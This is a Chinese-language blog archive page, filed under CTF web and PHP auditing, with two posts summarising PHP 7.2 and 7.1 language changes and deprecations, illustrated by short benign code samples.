<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="https://theganlove.github.io/page/2/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
  
<meta name="generator" content="Hexo 7.3.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
        
          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
        
        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://theganlove.github.io"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main">
  
    <article id="post-PHP7-2特性" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/08/31/PHP7-2%E7%89%B9%E6%80%A7/" class="article-date">
  <time class="dt-published" datetime="2024-08-31T05:49:27.000Z" itemprop="datePublished">2024-08-31</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/CTF-web/">CTF-web</a>►<a class="article-category-link" href="/categories/CTF-web/php%E5%AE%A1%E8%AE%A1/">php审计</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2024/08/31/PHP7-2%E7%89%B9%E6%80%A7/">PHP7.2特性</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="PHP7-2函数相关变更"><a href="#PHP7-2函数相关变更" class="headerlink" title="PHP7.2函数相关变更"></a>PHP7.2函数相关变更</h1><h2 id="（废弃）-autoload-方法"><a href="#（废弃）-autoload-方法" class="headerlink" title="（废弃）__autoload() 方法"></a>（废弃）__autoload() 方法</h2><p><code>__autoload()</code> 方法已被废弃， 因为和 <code>spl_autoload_register()</code> 相比功能较差 (因为无法链式处理多个 autoloader)， 而且也无法在两种 autoloading 样式中配合使用。</p>
<h2 id="（废弃）create-function-函数"><a href="#（废弃）create-function-函数" class="headerlink" title="（废弃）create_function() 函数"></a>（废弃）create_function() 函数</h2><p>考虑到此函数的安全隐患问题（它是 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.eval.php">eval()</a> 的瘦包装器），该过时的函数现在已被废弃。 更好的选择是<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/functions.anonymous.php">匿名函数</a>。</p>
<h2 id="（废弃）parse-str-不加第二个参数"><a href="#（废弃）parse-str-不加第二个参数" class="headerlink" title="（废弃）parse_str() 不加第二个参数"></a>（废弃）parse_str() 不加第二个参数</h2><p>使用 <code>parse_str()</code> 时，不加第二个参数会导致查询字符串参数导入当前符号表。 考虑到安全隐患问题，不加第二个参数使用 <code>parse_str()</code> 的行为已被废弃。 此函数的第二个选项为必填项，它使查询字符串转为 Array。</p>
<h2 id="（废弃）assert-一个字符串参数"><a href="#（废弃）assert-一个字符串参数" class="headerlink" title="（废弃）assert() 一个字符串参数"></a>（废弃）assert() 一个字符串参数</h2><p><code>assert()</code> 字符串参数将要求它能被 <code>eval()</code> 执行。 考虑到可能被执行远程代码，废弃了字符串的 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.assert.php">assert()</a>，最好提供 bool 的表达式。</p>
<h2 id="（移除）-utf8-encode-和-utf8-decode-¶"><a href="#（移除）-utf8-encode-和-utf8-decode-¶" class="headerlink" title="（移除） utf8_encode() 和 utf8_decode() ¶"></a>（移除） <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.utf8-encode.php">utf8_encode()</a> 和 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.utf8-decode.php">utf8_decode()</a><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/migration72.other-changes.php#migration72.other-changes.utf8_-functions-to-ext-standard"> ¶</a></h2><p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.utf8-encode.php">utf8_encode()</a> 和 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.utf8-decode.php">utf8_decode()</a> 现在已经作为字符串处理函数移到标准扩展中， 在此之前需要启用 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/book.xml.php">XML</a> 扩展才能使用。</p>
<h1 id="PHP7-2语法相关变更"><a href="#PHP7-2语法相关变更" class="headerlink" title="PHP7.2语法相关变更"></a>PHP7.2语法相关变更</h1><h2 id="（增加）允许重写抽象方法"><a href="#（增加）允许重写抽象方法" class="headerlink" title="（增加）允许重写抽象方法"></a>（增加）允许重写抽象方法</h2><p>当一个抽象类继承于另外一个抽象类的时候，继承后的抽象类可以重写被继承的抽象类的抽象方法。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">abstract</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$s</span></span>)</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">B</span> <span class="keyword">extends</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">// overridden - still maintaining contravariance for parameters and covariance for return</span></span><br><span class="line">    <span class="keyword">abstract</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"><span class="variable">$s</span></span>) : <span class="title">int</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="（增加）允许分组命名空间的尾部逗号"><a href="#（增加）允许分组命名空间的尾部逗号" class="headerlink" title="（增加）允许分组命名空间的尾部逗号"></a>（增加）允许分组命名空间的尾部逗号</h2><p>命名空间可以在PHP 7中使用尾随逗号进行分组引入。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Foo</span>\<span class="title">Bar</span>\&#123;</span><br><span class="line">    <span class="title">Foo</span>,</span><br><span class="line">    <span class="title">Bar</span>,</span><br><span class="line">    <span class="title">Baz</span>,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h2 id="（增加）转化数字键"><a href="#（增加）转化数字键" class="headerlink" title="（增加）转化数字键"></a>（增加）转化数字键</h2><p>转化数组为对象类型时，如果数组存在数字键，现在可以访问了。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">// array to object</span><br><span class="line">$arr = [0 =&gt; 1];</span><br><span class="line">$obj = (object)$arr;</span><br><span class="line">var_dump(</span><br><span class="line">    $obj,</span><br><span class="line">    $obj-&gt;&#123;&#x27;0&#x27;&#125;, // now accessible</span><br><span class="line">    $obj-&gt;&#123;0&#125; // now accessible</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"># 结果</span><br><span class="line">/*</span><br><span class="line">PHP&lt;7.2</span><br><span class="line">object(stdClass)#1 (1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  int(1)</span><br><span class="line">&#125;</span><br><span class="line">NULL</span><br><span class="line">NULL</span><br><span class="line"></span><br><span class="line">PHP7.2</span><br><span class="line">object(stdClass)#1 (1) &#123;</span><br><span class="line">  [&quot;0&quot;]=&gt;</span><br><span class="line">  int(1)</span><br><span class="line">&#125;</span><br><span class="line">int(1)</span><br><span class="line">int(1)</span><br></pre></td></tr></table></figure>

<p>对象转为数组也同样可以了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">// object to array</span><br><span class="line">$obj = new class &#123;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;&#123;0&#125; = 1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">$arr = (array)$obj;</span><br><span class="line">var_dump(</span><br><span class="line">    $arr,</span><br><span class="line">    $arr[0], // now accessible</span><br><span class="line">    $arr[&#x27;0&#x27;] // now accessible</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<h2 id="（废弃）不带引号的字符串"><a href="#（废弃）不带引号的字符串" class="headerlink" title="（废弃）不带引号的字符串"></a>（废弃）不带引号的字符串</h2><p>不带引号的字符串是不存在的全局常量，转化成他们自身的字符串。 在以前，该行为会产生 <strong>E_NOTICE</strong>，但现在会产生 <strong>E_WARNING</strong>。在下一个 PHP 主版本中，将抛出 <strong>Error</strong> 异常。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(NONEXISTENT);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Output:</span></span><br><span class="line"><span class="comment">Warning: Use of undefined constant NONEXISTENT - assumed &#x27;NONEXISTENT&#x27; (this will throw an Error in a future version of PHP) in %s on line %d</span></span><br><span class="line"><span class="comment">string(11) &quot;NONEXISTENT&quot;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<h1 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h1><h2 id="新的对象类型-¶"><a href="#新的对象类型-¶" class="headerlink" title="新的对象类型 ¶"></a>新的对象类型<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/migration72.new-features.php#migration72.new-features.object-type"> ¶</a></h2><h2 id="通过名称加载扩展-¶"><a href="#通过名称加载扩展-¶" class="headerlink" title="通过名称加载扩展 ¶"></a>通过名称加载扩展<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/migration72.new-features.php#migration72.new-features.ext-loading-by-name"> ¶</a></h2><h2 id="扩展了参数类型-¶"><a href="#扩展了参数类型-¶" class="headerlink" title="扩展了参数类型 ¶"></a>扩展了参数类型<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/migration72.new-features.php#migration72.new-features.param-type-widening"> ¶</a></h2><h2 id="Disallow-passing-NULL-to-get-class-¶"><a href="#Disallow-passing-NULL-to-get-class-¶" class="headerlink" title="Disallow passing NULL to get_class() ¶"></a>Disallow passing <strong>NULL</strong> to <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.get-class.php">get_class()</a><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/migration72.incompatible.php#migration72.incompatible.no-null-to-get_class"> ¶</a></h2>
      
    </div>
    <footer class="article-footer">
      <a data-url="https://theganlove.github.io/2024/08/31/PHP7-2%E7%89%B9%E6%80%A7/" data-id="cm0kx5k560003o8dkgnup90ql" data-title="PHP7.2特性" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web-php/" rel="tag">web php</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-PHP7-1特性" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/08/31/PHP7-1%E7%89%B9%E6%80%A7/" class="article-date">
  <time class="dt-published" datetime="2024-08-31T05:48:49.000Z" itemprop="datePublished">2024-08-31</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/CTF-web/">CTF-web</a>►<a class="article-category-link" href="/categories/CTF-web/php%E5%AE%A1%E8%AE%A1/">php审计</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2024/08/31/PHP7-1%E7%89%B9%E6%80%A7/">PHP7.1特性</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="PHP7-1函数相关变更"><a href="#PHP7-1函数相关变更" class="headerlink" title="PHP7.1函数相关变更"></a>PHP7.1函数相关变更</h1><h2 id="list-现在支持键名"><a href="#list-现在支持键名" class="headerlink" title="list()现在支持键名"></a>list()现在支持键名</h2><p>现在<code>list()</code>和它的新的*[]*语法支持在它内部去指定键名。这意味着它可以将任意类型的数组 都赋值给一些变量（与短数组语法类似）</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$data</span> = [</span><br><span class="line">    [<span class="string">&quot;id&quot;</span> =&gt; <span class="number">1</span>, <span class="string">&quot;name&quot;</span> =&gt; <span class="string">&#x27;Tom&#x27;</span>],</span><br><span class="line">    [<span class="string">&quot;id&quot;</span> =&gt; <span class="number">2</span>, <span class="string">&quot;name&quot;</span> =&gt; <span class="string">&#x27;Fred&#x27;</span>],</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="comment">// list() style</span></span><br><span class="line"><span class="keyword">list</span>(<span class="string">&quot;id&quot;</span> =&gt; <span class="variable">$id1</span>, <span class="string">&quot;name&quot;</span> =&gt; <span class="variable">$name1</span>) = <span class="variable">$data</span>[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// [] style</span></span><br><span class="line">[<span class="string">&quot;id&quot;</span> =&gt; <span class="variable">$id1</span>, <span class="string">&quot;name&quot;</span> =&gt; <span class="variable">$name1</span>] = <span class="variable">$data</span>[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// list() style</span></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$data</span> <span class="keyword">as</span> <span class="keyword">list</span>(<span class="string">&quot;id&quot;</span> =&gt; <span class="variable">$id</span>, <span class="string">&quot;name&quot;</span> =&gt; <span class="variable">$name</span>)) &#123;</span><br><span class="line">    <span class="comment">// logic here with $id and $name</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// [] style</span></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$data</span> <span class="keyword">as</span> [<span class="string">&quot;id&quot;</span> =&gt; <span class="variable">$id</span>, <span class="string">&quot;name&quot;</span> =&gt; <span class="variable">$name</span>]) &#123;</span><br><span class="line">    <span class="comment">// logic here with $id and $name</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="禁止动态调用的函数"><a href="#禁止动态调用的函数" class="headerlink" title="禁止动态调用的函数"></a>禁止动态调用的函数</h2><p>如下：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.assert.php">assert()</a> - with a string as the first argument</li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.compact.php">compact()</a></li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.extract.php">extract()</a></li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.func-get-args.php">func_get_args()</a></li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.func-get-arg.php">func_get_arg()</a></li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.func-num-args.php">func_num_args()</a></li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.get-defined-vars.php">get_defined_vars()</a></li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.mb-parse-str.php">mb_parse_str()</a> - with one arg</li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.parse-str.php">parse_str()</a> - with one arg</li>
</ul>
<p>尾随的<code>-</code>代表禁止动态调用的条件。<code>func_get_args</code>等几个函数测试了下好像并没有禁止动态调用？不太懂。</p>
<h2 id="unserialize"><a href="#unserialize" class="headerlink" title="unserialize"></a>unserialize</h2><p>对<code>allowed_classes</code>参数严格化，如果对其传入的值是<strong>布尔值</strong>和<strong>数组</strong>之外的内容，<code>unserialize</code>将返回<strong>False</strong>和<strong>E_WARNING</strong></p>
<h2 id="getenv可以不需要传入参数"><a href="#getenv可以不需要传入参数" class="headerlink" title="getenv可以不需要传入参数"></a>getenv可以不需要传入参数</h2><p><code>getenv()</code> 可以不传入任何参数。 如果不传入参数，此函数会以关联数组的形式 返回所有的环境变量。</p>
<p><img src="C:\Users\a1348\Desktop\WebBook-master\WebBook-master\images\19-10-1_PHP_PHP71函数相关变更_2.png"></p>
<h2 id="parse-url支持RFC3986"><a href="#parse-url支持RFC3986" class="headerlink" title="parse_url支持RFC3986"></a>parse_url支持RFC3986</h2><p><code>parse_url()</code> 更加严格的限制， 并且提供对 RFC3986 的支持。</p>
<h2 id="session-start将返回false"><a href="#session-start将返回false" class="headerlink" title="session_start将返回false"></a>session_start将返回false</h2><p><code>session_start()</code> 当无法成功初始化会话的时候，返回 <strong>FALSE</strong>， 并且不会初始化超级变量 <code>$_SESSION</code>。</p>
<p>但是我测试的时候发现，PHP7.0已经会返回False了（Win+PHP7.12nts</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">session_start</span>(<span class="string">&#x27;11&#x27;</span>));</span><br><span class="line">@<span class="title function_ invoke__">var_dump</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 结果</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">php5</span></span><br><span class="line"><span class="comment">bool(true)</span></span><br><span class="line"><span class="comment">array(0) &#123;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">PHP5</span></span><br><span class="line"><span class="comment">bool(false)</span></span><br><span class="line"><span class="comment">NULL</span></span><br></pre></td></tr></table></figure>

<h2 id="（废弃）两个函数的Eval选项"><a href="#（废弃）两个函数的Eval选项" class="headerlink" title="（废弃）两个函数的Eval选项"></a>（废弃）两个函数的Eval选项</h2><p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.mb-ereg-replace.php">mb_ereg_replace()</a>和<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.mb-eregi-replace.php">mb_eregi_replace()</a></p>
<h2 id="（废弃）ext-mcrypt"><a href="#（废弃）ext-mcrypt" class="headerlink" title="（废弃）ext&#x2F;mcrypt"></a>（废弃）ext&#x2F;mcrypt</h2><h1 id="PHP7-1语法相关的变更"><a href="#PHP7-1语法相关的变更" class="headerlink" title="PHP7.1语法相关的变更"></a>PHP7.1语法相关的变更</h1><h2 id="增加）短数组"><a href="#增加）短数组" class="headerlink" title="(增加）短数组"></a>(增加）短数组</h2><p>短数组语法<code>[]</code>现在作为<code>list()</code>语法的一个备选项，可以用于将数组的值赋给一些变量（包括在<em>foreach</em>中）。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$data</span> = [</span><br><span class="line">    [<span class="number">1</span>, <span class="string">&#x27;Tom&#x27;</span>],</span><br><span class="line">    [<span class="number">2</span>, <span class="string">&#x27;Fred&#x27;</span>],</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$data</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// list() style</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">list</span>(<span class="variable">$id1</span>, <span class="variable">$name1</span>) = <span class="variable">$data</span>[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// [] style</span></span><br><span class="line"><span class="comment">#[$id1, $name1] = $data[0];</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// list() style</span></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$data</span> <span class="keyword">as</span> <span class="keyword">list</span>(<span class="variable">$id</span>, <span class="variable">$name</span>)) &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$id</span> <span class="subst">$name</span>\n&quot;</span>;</span><br><span class="line">    <span class="comment">// logic here with $id and $name</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// [] style</span></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$data</span> <span class="keyword">as</span> [<span class="variable">$id</span>, <span class="variable">$name</span>]) &#123;</span><br><span class="line">    <span class="comment">// logic here with $id and $name</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="（增加）支持为负的字符串偏移量"><a href="#（增加）支持为负的字符串偏移量" class="headerlink" title="（增加）支持为负的字符串偏移量"></a>（增加）支持为负的字符串偏移量</h2><p>现在所有支持偏移量的<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/book.strings.php">字符串操作函数</a> 都支持接受负数作为偏移量，包括通过<code>[]</code>或<code>&#123;&#125;</code>操作<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.types.string.php#language.types.string.substr">字符串下标</a>。在这种情况下，一个负数的偏移量会被理解为一个从字符串结尾开始的偏移量。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&quot;abcdef&quot;</span>[-<span class="number">2</span>]); <span class="comment">// string (1) &quot;e&quot;</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">strpos</span>(<span class="string">&quot;aabbcc&quot;</span>, <span class="string">&quot;b&quot;</span>, -<span class="number">3</span>));  <span class="comment">// int(3)</span></span><br></pre></td></tr></table></figure>

<p>字符串也同样支持</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$string</span> = <span class="string">&#x27;bar&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;The last character of &#x27;<span class="subst">$string</span>&#x27; is &#x27;<span class="subst">$string</span>[-1]&#x27;.\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 结果</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">The last character of &#x27;bar&#x27; is &#x27;r&#x27;.</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<h2 id="（增加）当传递参数过少时将抛出错误"><a href="#（增加）当传递参数过少时将抛出错误" class="headerlink" title="（增加）当传递参数过少时将抛出错误"></a>（增加）当传递参数过少时将抛出错误</h2><p>在过去如果我们调用一个用户定义的函数时，提供的参数不足，那么将会产生一个警告(warning)。 现在，这个警告被提升为一个错误异常(Error exception)，意味着PHP会中断执行。这个变更仅对用户定义的函数生效， 并不包含内置函数。例如：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"><span class="variable">$param</span></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;1\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">system</span>();</span><br><span class="line"><span class="title function_ invoke__">test</span>();</span><br></pre></td></tr></table></figure>

<p><img src="/Users/j7ur8/WebBook/BookBuild/images/19-10-2_PHP_PHP71%E8%AF%AD%E6%B3%95%E7%9B%B8%E5%85%B3%E5%8F%98%E6%9B%B4_1.png"></p>
<h2 id="引用数组元素创建元素的顺序更改"><a href="#引用数组元素创建元素的顺序更改" class="headerlink" title="引用数组元素创建元素的顺序更改"></a>引用数组元素创建元素的顺序更改</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$array = [];</span><br><span class="line">$array[&quot;a&quot;] =&amp; $array[&quot;b&quot;];</span><br><span class="line">$array[&quot;b&quot;] = 1;</span><br><span class="line">var_dump($array);</span><br><span class="line"></span><br><span class="line"># 结果</span><br><span class="line">/*</span><br><span class="line">PHP7.0</span><br><span class="line">array(2) &#123;</span><br><span class="line">  [&quot;a&quot;]=&gt;</span><br><span class="line">  &amp;int(1)</span><br><span class="line">  [&quot;b&quot;]=&gt;</span><br><span class="line">  &amp;int(1)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PHP7.1</span><br><span class="line">array(2) &#123;</span><br><span class="line">  [&quot;b&quot;]=&gt;</span><br><span class="line">  &amp;int(1)</span><br><span class="line">  [&quot;a&quot;]=&gt;</span><br><span class="line">  &amp;int(1)</span><br><span class="line">&#125;</span><br><span class="line">*/</span><br></pre></td></tr></table></figure>

